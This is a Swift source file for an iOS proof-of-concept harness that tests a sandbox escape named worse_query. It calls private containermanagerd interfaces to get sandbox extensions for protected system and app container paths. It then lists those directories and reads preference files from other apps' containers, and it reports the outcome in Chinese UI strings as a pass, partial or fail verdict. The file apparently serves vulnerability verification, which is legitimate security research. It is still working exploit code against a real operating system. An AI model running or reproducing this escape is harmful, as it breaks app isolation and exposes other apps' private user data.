//
//  Diagnostics.swift
//  Staged, read-only verification of worse_query.
//
//  Produces a structured report so the UI can show a verdict, a stage
//  checklist and per-path cards instead of a raw log.
//

import Foundation

enum Diagnostics {

    enum Status { case pass, fail, warn, info, skip }
    enum Verdict { case pass, partial, fail, untestable }

    struct Stage {
        let title: String
        let status: Status
        let detail: String
    }

    struct ChildResult {
        let name: String
        let containerID: String
        let metadataID: String
        let readBytes: Int
        let error: String
    }

    struct TargetResult {
        let label: String
        let path: String
        let exists: Bool
        let preListable: Bool
        let preErrno: Int32
        let handle: Int64
        let postListable: Bool
        let postErrno: Int32
        let entryCount: Int
        let children: [ChildResult]

        var childReads: Int { children.filter { $0.readBytes > 0 }.count }

        var status: Status {
            if handle >= 0 && postListable { return .pass }
            if handle >= 0 { return .warn }
            if !exists && handle == -255 { return .skip }
            return .fail
        }

        var summaryLine: String {
            var parts: [String] = ["handle \(handle)"]
            parts.append(preListable ? "消费前可读" : "消费前 EPERM")
            if handle >= 0 {
                parts.append(postListable ? "消费后 \(entryCount) 项" : "消费后拒绝")
            }
            if childReads > 0 { parts.append("子读取 \(childReads)") }
            return parts.joined(separator: " · ")
        }
    }

    struct Report {
        let verdict: Verdict
        let headline: String
        let subheadline: String
        let iosVersion: String
        let device: String
        let stages: [Stage]
        let targets: [TargetResult]
        let handles: Int
        let listings: Int
        let deepReads: Int
        let preDenied: Int
        let symbolReport: String
        let groupIdentifier: String
        let groupPath: String
        let rawLog: String
    }

    struct Target {
        let label: String
        let path: String
        let deep: Bool
    }

    private static let targets: [Target] = [
        Target(label: "AppGroup 根目录",
               path: "/private/var/mobile/Containers/Shared/AppGroup", deep: true),
        Target(label: "App 数据容器",
               path: "/private/var/mobile/Containers/Data/Application", deep: true),
        Target(label: "InternalDaemon 容器",
               path: "/private/var/mobile/Containers/Data/InternalDaemon", deep: true),
        Target(label: "PluginKitPlugin 容器",
               path: "/private/var/mobile/Containers/Data/PluginKitPlugin", deep: true),
        Target(label: "SystemGroup (iOS 27)",
               path: "/private/var/containers/Shared/SystemGroup", deep: true),
        Target(label: "System 数据 (iOS 27)",
               path: "/private/var/containers/Data/System", deep: false),
    ]

    static func run(group: String) -> Report {
        var raw: [String] = []
        let emit: (String) -> Void = { raw.append($0) }

        let v = ProcessInfo.processInfo.operatingSystemVersion
        let version = "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
        let device = deviceModel()

        emit("worse_query verification harness")
        emit("iOS \(version) | \(device)")
        emit("")

        var stages: [Stage] = []

        // MARK: Stage 1 - App Group entitlement
        emit("== Stage 1: App Group entitlement ==")
        let fm = FileManager.default
        var groupPath = ""
        var groupOK = false

        if group.isEmpty {
            emit("[FAIL] WQAppGroup is empty in Info.plist")
            stages.append(Stage(title: "App Group entitlement",
                                status: .fail,
                                detail: "Info.plist 中 WQAppGroup 为空"))
        } else if let url = fm.containerURL(forSecurityApplicationGroupIdentifier: group) {
            groupOK = true
            groupPath = url.path
            emit("[PASS] group container: \(url.path)")
            stages.append(Stage(title: "App Group entitlement",
                                status: .pass,
                                detail: group))
            try? fm.createDirectory(at: url.appendingPathComponent("Library"),
                                    withIntermediateDirectories: true)
        } else {
            emit("[FAIL] containerURL(forSecurityApplicationGroupIdentifier:) == nil")
            stages.append(Stage(title: "App Group entitlement",
                                status: .fail,
                                detail: "entitlement 缺失，或 group 不在 signing profile 中"))
        }
        emit("")

        guard groupOK else {
            return Report(verdict: .untestable,
                          headline: "无法验证",
                          subheadline: "App Group entitlement 没生效，PoC 连入口都没有",
                          iosVersion: version,
                          device: device,
                          stages: stages,
                          targets: [],
                          handles: 0,
                          listings: 0,
                          deepReads: 0,
                          preDenied: 0,
                          symbolReport: "not checked",
                          groupIdentifier: group,
                          groupPath: "",
                          rawLog: raw.joined(separator: "\n"))
        }

        // MARK: Stage 2 - private symbols
        emit("== Stage 2: private containermanagerd symbols ==")
        let symbolReport: String = wq_diag_symbol_report() ?? "FAIL: nil"
        let symbolsOK = symbolReport.hasPrefix("OK")
        emit(symbolsOK ? "[PASS] \(symbolReport)" : "[FAIL] \(symbolReport)")
        stages.append(Stage(title: "containermanagerd 私有符号",
                            status: symbolsOK ? .pass : .fail,
                            detail: symbolReport))
        emit("")

        guard symbolsOK else {
            return Report(verdict: .fail,
                          headline: "无法调用私有接口",
                          subheadline: "containermanagerd 的符号缺失，系统可能改了实现",
                          iosVersion: version,
                          device: device,
                          stages: stages,
                          targets: [],
                          handles: 0,
                          listings: 0,
                          deepReads: 0,
                          preDenied: 0,
                          symbolReport: symbolReport,
                          groupIdentifier: group,
                          groupPath: groupPath,
                          rawLog: raw.joined(separator: "\n"))
        }

        // MARK: Stage 3 - per-target escape
        emit("== Stage 3: sandbox extension per target ==")
        var results: [TargetResult] = []
        var handles = 0
        var listings = 0
        var deepReads = 0
        var preDenied = 0

        for (i, target) in targets.enumerated() {
            emit("")
            emit("[\(i + 1)/\(targets.count)] \(target.label)")
            emit("    \(target.path)")

            var st = stat()
            let exists = lstat(target.path, &st) == 0
            let lstErr = errno
            let lstText = exists ? "ok" : "fail errno=\(lstErr)"
            emit("    lstat: \(lstText)")

            var preErr: Int32 = 0
            let pre = wq_listdir(target.path, &preErr, 8)
            let preListable = pre != nil
            if !preListable && (preErr == EPERM || preErr == EACCES) { preDenied += 1 }
            let preText = preListable ? "listable (\(pre?.count ?? 0)+)" : "denied errno=\(preErr)"
            emit("    before: \(preText)")

            var handle = worse_query(target.path, group, false, false)
            emit("    worse_query(false,false) -> \(handle) \(code(handle))")

            if handle == -255 {
                handle = worse_query(target.path, group, false, true)
                emit("    worse_query(false,true)  -> \(handle) \(code(handle))")
            }
            if handle < 0 {
                let alt = worse_query(target.path, group, true, false)
                emit("    worse_query(true,false)  -> \(alt) \(code(alt))")
                if alt >= 0 { handle = alt }
            }

            var post: [String]?
            var postErr: Int32 = 0
            var children: [ChildResult] = []

            if handle >= 0 {
                handles += 1
                post = wq_listdir(target.path, &postErr, 16)
                if let post = post {
                    emit("    [PASS] after: listable, \(post.count) entries")
                    emit("    sample: \(post.prefix(8).joined(separator: ", "))")
                } else {
                    emit("    [WARN] after: denied errno=\(postErr)")
                }

                if target.deep, let post = post {
                    let probe = deepProbe(root: target.path,
                                          children: Array(post.prefix(2)),
                                          group: group,
                                          emit: emit)
                    deepReads += probe.reads
                    children = probe.children
                }

                worse_query_release(handle)
                emit("    released \(handle)")
            } else {
                emit("    [FAIL] no extension")
            }

            if post != nil { listings += 1 }

            results.append(TargetResult(label: target.label,
                                        path: target.path,
                                        exists: exists,
                                        preListable: preListable,
                                        preErrno: preErr,
                                        handle: handle,
                                        postListable: post != nil,
                                        postErrno: postErr,
                                        entryCount: post?.count ?? 0,
                                        children: children))
        }

        // MARK: Stage 3/4 summary
        let stage3Status: Status
        if handles > 0 && listings > 0 {
            stage3Status = .pass
        } else if handles > 0 {
            stage3Status = .warn
        } else {
            stage3Status = .fail
        }
        stages.append(Stage(title: "目标路径逃逸",
                            status: stage3Status,
                            detail: "\(handles)/\(targets.count) 个目标拿到 extension，\(listings) 个目录可读"))

        let stage4Status: Status = deepReads > 0 ? .pass : (handles > 0 ? .warn : .skip)
        stages.append(Stage(title: "跨容器真实读取",
                            status: stage4Status,
                            detail: deepReads > 0
                                ? "\(deepReads) 个其他 App 容器的文件读取成功"
                                : "没有跨容器文件读取成功"))

        // MARK: Verdict
        let verdict: Verdict
        let headline: String
        let subheadline: String

        if handles > 0 && (listings > 0 || deepReads > 0) {
            verdict = .pass
            headline = "沙盒逃逸生效"
            subheadline = "拿到 \(handles) 个 extension，\(listings) 个目录可读，\(deepReads) 个跨容器文件可读"
        } else if handles > 0 {
            verdict = .partial
            headline = "逃逸部分生效"
            subheadline = "extension 签发成功，但目录/文件读不到"
        } else {
            verdict = .fail
            headline = "沙盒逃逸未生效"
            subheadline = "\(targets.count) 个目标全部没拿到 extension；可能已修复或 flags 不对"
        }

        emit("")
        emit("== VERDICT ==")
        emit("\(headline) - \(subheadline)")
        emit("handles \(handles)/\(targets.count), listings \(listings), deep reads \(deepReads), pre-denied \(preDenied)")
        emit("[NOTE] read-only; only writes inside its own App Group")

        return Report(verdict: verdict,
                      headline: headline,
                      subheadline: subheadline,
                      iosVersion: version,
                      device: device,
                      stages: stages,
                      targets: results,
                      handles: handles,
                      listings: listings,
                      deepReads: deepReads,
                      preDenied: preDenied,
                      symbolReport: symbolReport,
                      groupIdentifier: group,
                      groupPath: groupPath,
                      rawLog: raw.joined(separator: "\n"))
    }

    /// Consumes a per-container extension, then tries to read real container data.
    private static func deepProbe(root: String,
                                  children: [String],
                                  group: String,
                                  emit: (String) -> Void) -> (reads: Int, children: [ChildResult]) {
        var reads = 0
        var out: [ChildResult] = []

        for child in children {
            let childPath = root + "/" + child
            let h = worse_query(childPath, group, false, true)
            if h < 0 {
                emit("      child \(child): extension failed \(h) \(code(h))")
                out.append(ChildResult(name: child, containerID: "?", metadataID: "?",
                                       readBytes: 0, error: "ext \(h)"))
                continue
            }

            let cid = wq_container_id(childPath) ?? "?"
            let meta = wq_container_metadata(childPath)
            let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"

            var readBytes = 0
            var errText = ""
            var prefErr: Int32 = 0
            let prefs = wq_listdir(childPath + "/Library/Preferences", &prefErr, 8)

            if let prefs = prefs, let first = prefs.first {
                var readErr: Int32 = 0
                if let data = wq_readfile(childPath + "/Library/Preferences/" + first,
                                          4096, &readErr) {
                    readBytes = data.count
                    emit("      child \(child): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B")
                } else {
                    errText = "read errno \(readErr)"
                    emit("      child \(child): ext=ok id=\(cid) meta=\(mid) \(errText)")
                }
            } else {
                errText = "prefs errno \(prefErr)"
                emit("      child \(child): ext=ok id=\(cid) meta=\(mid) \(errText)")
            }

            if readBytes > 0 { reads += 1 }
            out.append(ChildResult(name: child, containerID: cid, metadataID: mid,
                                   readBytes: readBytes, error: errText))
            worse_query_release(h)
        }

        return (reads, out)
    }

    private static func code(_ h: Int64) -> String {
        switch h {
        case -1:   return "(-1: App Group container unavailable)"
        case -2:   return "(-2: dlopen/dlsym failed)"
        case -3:   return "(-3: container_query_create failed)"
        case -4:   return "(-4: symlink creation failed)"
        case -5:   return "(-5: query rejected by containermanagerd)"
        case -6:   return "(-6: kernel refused sandbox token)"
        case -255: return "(-255: target lstat failed)"
        default:   return h >= 0 ? "(valid extension handle)" : "(unknown)"
        }
    }

    private static func deviceModel() -> String {
        var uts = utsname()
        uname(&uts)
        return withUnsafePointer(to: &uts.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
    }
}

extension Diagnostics.Status {
    var text: String {
        switch self {
        case .pass: return "PASS"
        case .fail: return "FAIL"
        case .warn: return "WARN"
        case .info: return "INFO"
        case .skip: return "SKIP"
        }
    }
}

extension Diagnostics.TargetResult {
    var statusWord: String { status.text }
}

extension Diagnostics.Report {
    var shareText: String {
        var s = "worse_query 验证结论\n"
        s += "\(headline)\n"
        s += "\(subheadline)\n"
        s += "iOS \(iosVersion) | \(device)\n"
        s += "App Group: \(groupIdentifier)\n"
        s += "extension \(handles)/\(targets.count) | 目录可读 \(listings) | 跨容器读取 \(deepReads)\n\n"

        for t in targets {
            let pre = t.preListable ? "可读" : "EPERM(\(t.preErrno))"
            let post = t.postListable ? "\(t.entryCount)项" : "拒绝(\(t.postErrno))"
            s += "[\(t.statusWord)] \(t.label)\n"
            s += "  \(t.path)\n"
            s += "  handle=\(t.handle) 消费前=\(pre) 消费后=\(post) 子读取=\(t.childReads)\n"
        }

        s += "\n--- 原始日志 ---\n\(rawLog)\n"
        return s
    }
}